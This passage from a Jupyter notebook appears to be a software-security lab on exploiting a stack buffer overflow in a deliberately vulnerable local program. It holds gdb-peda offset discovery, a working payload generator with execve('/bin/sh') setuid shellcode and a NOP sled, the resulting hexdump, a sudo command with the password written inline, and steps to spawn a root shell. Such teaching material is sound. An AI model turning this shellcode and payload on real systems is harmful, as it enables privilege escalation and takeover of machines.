      "   0x4011fb <vulnerable(char*)+5>:\u001b[m\tmov    rbp,rsp\u001b[0m\n",
      "   0x4011fe <vulnerable(char*)+8>:\u001b[m\tadd    rsp,0xffffffffffffff80\u001b[0m\n",
      "   0x401202 <vulnerable(char*)+12>:\u001b[m\tmov    QWORD PTR [rbp-0x78],rdi\u001b[0m\u001b[0m\n",
      "\u001b[m\u001b[;34m[------------------------------------stack-------------------------------------]\u001b[0m\u001b[0m\n",
      "\u001b[m0000| \u001b[;34m0x7fffffffd078\u001b[0m --> \u001b[;31m0x4012b0\u001b[0m (<main(int, char**)+108>:\t)\u001b[0m\n",
      "\u001b[m0008| \u001b[;34m0x7fffffffd080\u001b[0m --> \u001b[;34m0x7fffffffd258\u001b[0m --> \u001b[;34m0x7fffffffd7a3\u001b[0m (\"/workspaces/SoftwareSecurity/demos/stack_overflow/x64/stack.exe\")\u001b[0m\n",
      "\u001b[m0016| \u001b[;34m0x7fffffffd088\u001b[0m --> 0x2f7fb8dc8 \u001b[0m\n",
      "\u001b[m0024| \u001b[;34m0x7fffffffd090\u001b[0m (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...)\u001b[0m\n",
      "\u001b[m0032| \u001b[;34m0x7fffffffd098\u001b[0m (\"ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[m0040| \u001b[;34m0x7fffffffd0a0\u001b[0m (\"AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[m0048| \u001b[;34m0x7fffffffd0a8\u001b[0m (\"(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[m0056| \u001b[;34m0x7fffffffd0b0\u001b[0m (\"A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[;34m[------------------------------------------------------------------------------]\u001b[0m\n",
      "\u001b[mLegend: \u001b[;31mcode\u001b[0m, \u001b[;34mdata\u001b[0m, \u001b[;32mrodata\u001b[0m, value\u001b[0m\n",
      "\n",
      "Breakpoint 1, \u001b[33mvulnerable\u001b[m (\u001b[36mstr\u001b[m=0x0) at \u001b[32mstack.cpp\u001b[m:11\n",
      "11\tvoid vulnerable(char *str) {\n",
      "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA�nA\n",
      "\n",
      "Program received signal SIGSEGV, Segmentation fault.\n",
      "\u001b[;34m[----------------------------------registers-----------------------------------]\u001b[0m\n",
      "\u001b[m\u001b[;32mRAX\u001b[0m: \u001b[;34m0x404080\u001b[0m --> \u001b[;32m0x7ffff7fb33d0\u001b[0m --> \u001b[;31m0x7ffff7f0c430\u001b[0m (<_ZNSoD1Ev>:\tendbr64)\n",
      "\u001b[;32mRBX\u001b[0m: \u001b[;31m0x401350\u001b[0m (<__libc_csu_init>:\tendbr64)\n",
      "\u001b[;32mRCX\u001b[0m: \u001b[;31m0x7ffff7cf6297\u001b[0m (<__GI___libc_write+23>:\tcmp    rax,0xfffffffffffff000)\n",
      "\u001b[;32mRDX\u001b[0m: 0x0 \n",
      "\u001b[;32mRSI\u001b[0m: 0x0 \n",
      "\u001b[;32mRDI\u001b[0m: \u001b[;34m0x7ffff7dd67e0\u001b[0m --> 0x0 \n",
      "\u001b[;32mRBP\u001b[0m: 0x41414e4141384141 ('AA8AANAA')\n",
      "\u001b[;32mRSP\u001b[0m: \u001b[;34m0x7fffffffd078\u001b[0m (\"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\n",
      "\u001b[;32mRIP\u001b[0m: \u001b[;31m0x401243\u001b[0m (<vulnerable(char*)+77>:\tret)\n",
      "\u001b[;32mR8 \u001b[0m: 0x0 \n",
      "\u001b[;32mR9 \u001b[0m: 0x0 \n",
      "\u001b[;32mR10\u001b[0m: 0xfffffffffffff04a \n",
      "\u001b[;32mR11\u001b[0m: \u001b[;31m0x7ffff7c6a340\u001b[0m (<__GI__IO_fflush>:\tendbr64)\n",
      "\u001b[;32mR12\u001b[0m: \u001b[;31m0x401110\u001b[0m (<_start>:\tendbr64)\n",
      "\u001b[;32mR13\u001b[0m: \u001b[;34m0x7fffffffd250\u001b[0m --> 0x2 \n",
      "\u001b[;32mR14\u001b[0m: 0x0 \n",
      "\u001b[;32mR15\u001b[0m: 0x0\u001b[0m\n",
      "\u001b[m\u001b[;32mEFLAGS\u001b[0m: 0x10213 (\u001b[;1;31mCARRY\u001b[0m \u001b[;32mparity\u001b[0m \u001b[;1;31mADJUST\u001b[0m \u001b[;32mzero\u001b[0m \u001b[;32msign\u001b[0m \u001b[;32mtrap\u001b[0m \u001b[;1;31mINTERRUPT\u001b[0m \u001b[;32mdirection\u001b[0m \u001b[;32moverflow\u001b[0m)\u001b[0m\n",
      "\u001b[m\u001b[;34m[-------------------------------------code-------------------------------------]\u001b[0m\u001b[0m\n",
      "\u001b[m   0x40123c <vulnerable(char*)+70>:\u001b[;2;32m\tcall   0x4010d0 <_ZNSolsEPFRSoS_E@plt>\u001b[0m\n",
      "   0x401241 <vulnerable(char*)+75>:\u001b[;2m\tnop\u001b[0m\n",
      "   0x401242 <vulnerable(char*)+76>:\u001b[;2m\tleave  \u001b[0m\n",
      "=> 0x401243 <vulnerable(char*)+77>:\u001b[;1;32m\tret    \u001b[0m\n",
      "   0x401244 <main(int, char**)>:\u001b[m\tendbr64 \u001b[0m\n",
      "   0x401248 <main(int, char**)+4>:\u001b[m\tpush   rbp\u001b[0m\n",
      "   0x401249 <main(int, char**)+5>:\u001b[m\tmov    rbp,rsp\u001b[0m\n",
      "   0x40124c <main(int, char**)+8>:\u001b[m\tsub    rsp,0xe0\u001b[0m\u001b[0m\n",
      "\u001b[m\u001b[;34m[------------------------------------stack-------------------------------------]\u001b[0m\u001b[0m\n",
      "\u001b[m0000| \u001b[;34m0x7fffffffd078\u001b[0m (\"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[m0008| \u001b[;34m0x7fffffffd080\u001b[0m (\"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[m0016| \u001b[;34m0x7fffffffd088\u001b[0m (\"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[m0024| \u001b[;34m0x7fffffffd090\u001b[0m (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[m0032| \u001b[;34m0x7fffffffd098\u001b[0m (\"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[m0040| \u001b[;34m0x7fffffffd0a0\u001b[0m (\"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[m0048| \u001b[;34m0x7fffffffd0a8\u001b[0m (\"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[m0056| \u001b[;34m0x7fffffffd0b0\u001b[0m (\"AuAAXAAvAAYAAwAAZAAxAAyA\\260nA\")\u001b[0m\n",
      "\u001b[;34m[------------------------------------------------------------------------------]\u001b[0m\n",
      "\u001b[mLegend: \u001b[;31mcode\u001b[0m, \u001b[;34mdata\u001b[0m, \u001b[;32mrodata\u001b[0m, value\u001b[0m\n",
      "\u001b[mStopped reason: \u001b[;31mSIGSEGV\u001b[0m\u001b[0m\n",
      "\u001b[34m0x0000000000401243\u001b[m in \u001b[33mvulnerable\u001b[m (\u001b[m\n",
      "    \u001b[m\u001b[36mstr\u001b[m=0x7fffffffd090 \"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260nA\") at \u001b[32mstack.cpp\u001b[m:15\n",
      "15\t}\n",
      "\u001b[;31mRegisters contain pattern buffer:\u001b[0m\n",
      "\u001b[mRBP+0 found at offset: 112\u001b[0m\n",
      "\u001b[;33mRegisters point to pattern buffer:\u001b[0m\n",
      "\u001b[m[RSP] --> offset 120 - size ~86\u001b[0m\n",
      "\u001b[;32mPattern buffer found at:\u001b[0m\n",
      "\u001b[m0x00417090 : offset    0 - size  500 ([heap])\u001b[0m\n",
      "\u001b[m0x004180a0 : offset    0 - size  200 ([heap])\u001b[0m\n",
      "\u001b[m0x00007ffff7be7bec : offset 33208 - size    4 (/usr/lib/x86_64-linux-gnu/libm-2.31.so)\u001b[0m\n",
      "\u001b[m0x00007fffffffd000 : offset    0 - size  200 ($sp + -0x78 [-30 dwords])\u001b[0m\n",
      "\u001b[m0x00007fffffffd0cc : offset   60 - size  140 ($sp + 0x54 [21 dwords])\u001b[0m\n",
      "\u001b[;34mReferences to pattern buffer found at:\u001b[0m\n",
      "\u001b[m0x00416ec8 : 0x00417090 ([heap])\u001b[0m\n",
      "\u001b[m0x00416ed0 : 0x00417090 ([heap])\u001b[0m\n",
      "\u001b[m0x00416ed8 : 0x00417090 ([heap])\u001b[0m\n",
      "\u001b[m0x00416ee0 : 0x00417090 ([heap])\u001b[0m\n",
      "\u001b[m0x00416ee8 : 0x00417090 ([heap])\u001b[0m\n",
      "\u001b[m0x00007ffff7dd56a8 : 0x004180a0 (/usr/lib/x86_64-linux-gnu/libc-2.31.so)\u001b[0m\n",
      "\u001b[m0x00007ffff7dd56b0 : 0x004180a0 (/usr/lib/x86_64-linux-gnu/libc-2.31.so)\u001b[0m\n",
      "\u001b[m0x00007ffff7dd56b8 : 0x004180a0 (/usr/lib/x86_64-linux-gnu/libc-2.31.so)\u001b[0m\n",
      "\u001b[m0x00007ffff7dd56c0 : 0x004180a0 (/usr/lib/x86_64-linux-gnu/libc-2.31.so)\u001b[0m\n",
      "\u001b[m0x00007ffff7dd56c8 : 0x004180a0 (/usr/lib/x86_64-linux-gnu/libc-2.31.so)\u001b[0m\n",
      "\u001b[m0x00007ffff7dd56d0 : 0x004180a0 (/usr/lib/x86_64-linux-gnu/libc-2.31.so)\u001b[0m\n",
      "\u001b[m0x00007ffff7dd56d8 : 0x004180a0 (/usr/lib/x86_64-linux-gnu/libc-2.31.so)\u001b[0m\n",
      "\u001b[m0x00007fffffffcc58 : 0x004180a0 ($sp + -0x420 [-264 dwords])\u001b[0m\n",
      "\u001b[m0x00007fffffffcf18 : 0x004180a0 ($sp + -0x160 [-88 dwords])\u001b[0m\n",
      "\u001b[m0x00007fffffffcfa0 : 0x00007fffffffd000 ($sp + -0xd8 [-54 dwords])\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "# using peda to find the offset using cyclic pattern\n",
    "# Look for [RSP] --> offset VALUE or [RBP]+8; note NO offset to RIP is printed\n",
    "! gdb -x peda.gdb ./stack.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "b63be74c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#! /usr/bin/env python3\r\n",
      "\r\n",
      "import sys\r\n",
      "\r\n",
      "# Replace the content with the actual shellcode\r\n",
      "# 64-bit execve('/bin/sh') setuid shellcode\r\n",
      "SHELLCODE = (\r\n",
      "    \"\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\"\r\n",
      "    \"\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\"\r\n",
      "    \"\\x48\\x89\\xe6\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05\"\r\n",
      ").encode('latin-1')\r\n",
      "\r\n",
      "PAYLOAD_LEN = 120  # 112 Offset to rbp + 8 bytes\r\n",
      "SHELLCODE_LEN = len(SHELLCODE)\r\n",
      "ADD_LEN = 8  # Length of the address 4 for 32-bit and 8 for 64-bit\r\n",
      "NOP_LEN = PAYLOAD_LEN - SHELLCODE_LEN\r\n",
      "\r\n",
      "# FIXME if needed\r\n",
      "GDB_SHIFT_COMPENSATION = 300 # stack is shigted higher in GDB due to its own environment variables, args, etc.\r\n",
      "RET_ADD = 0x7fffffffd090 + GDB_SHIFT_COMPENSATION  # FIXME: Change this address\r\n",
      "\r\n",
      "# Remove the 00 from the address\r\n",
      "# Note, 300 is added because the address shown in the gdb is different from\r\n",
      "# the actual address shown in the stack when the program is running.\r\n",
      "# This is because gdb pushes some values to the stack before running the program.\r\n",
      "# You can try different values to get the correct address if the attack is not successful.\r\n",
      "# Also, leading 00s not printed in gdb, but are automatically added by\r\n",
      "#  .to_bytes(ADD_LEN, byteorder='little') to make it 8 bytes long.\r\n",
      "\r\n",
      "#####################################################################\r\n",
      "# Build the payload\r\n",
      "# The content of the badfile is as follows:\r\n",
      "NOP_SLED = b'\\x90'*NOP_LEN\r\n",
      "repeated_add = (RET_ADD).to_bytes(ADD_LEN, byteorder='little')\r\n",
      "payload = NOP_SLED + SHELLCODE + repeated_add\r\n",
      "\r\n",
      "# Write the payload to a binary file\r\n",
      "with open('badfile.bin', 'wb') as f:\r\n",
      "    f.write(payload)\r\n",
      "\r\n",
      "#####################################################################\r\n"
     ]
    }
   ],
   "source": [
    "# Python script to generate the payload\n",
    "# make sure to FIX any FIXMEs to match your environment\n",
    "! cat generate_payload.py"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "3927156b",
   "metadata": {},
   "outputs": [],
   "source": [
    "! python generate_payload.py"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "fb76d486",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "128 badfile.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c badfile.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "8f155d82",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\r\n",
      "*\r\n",
      "00000050  90 90 90 90 90 90 90 90  90 90 48 31 d2 52 48 b8  |..........H1.RH.|\r\n",
      "00000060  2f 62 69 6e 2f 2f 73 68  50 48 89 e7 52 57 48 89  |/bin//shPH..RWH.|\r\n",
      "00000070  e6 48 31 c0 b0 3b 0f 05  bc d1 ff ff ff 7f 00 00  |.H1..;..........|\r\n",
      "00000080\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C badfile.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "19d2888e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# create a /bin/sh symlink to /bin/zsh\n",
    "! echo kali | sudo -S ln -sf /bin/zsh /bin/sh"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f79532ba",
   "metadata": {},
   "source": [
    "### Exploitation\n",
    "\n",
    "- run `stack.exe badfile.bin` from the Terminal to exploit the program with the payload in `badfile.bin`\n",
    "- the program will execute the payload and spawn a shell as root\n",
    "- the return address in the payload is many need to be adjusted to land it in the NOP sled\n",
    "- you may need to do a bit of trial and error to get the correct address to land in the NOP sled\n",
    "- you can write a bash script to automate the process\n",
    "\n",
    "## Small Buffer Challenge\n",
    "- if the buffer is too small to fit the payload, you can't put the payload in the buffer before the return address\n",
    "- you can't put the payload after the return address because of the null bytes in the return address\n",
    "     - strcpy will stop copying when it encounters the null bytes\n",
    "- however, the payload is already loaded into main's stack frame\n",
    "- you can find the address of the payload in main's stack and use that address as the return address\n",
    "- this is left as an exercise for the reader"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1407eff9",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
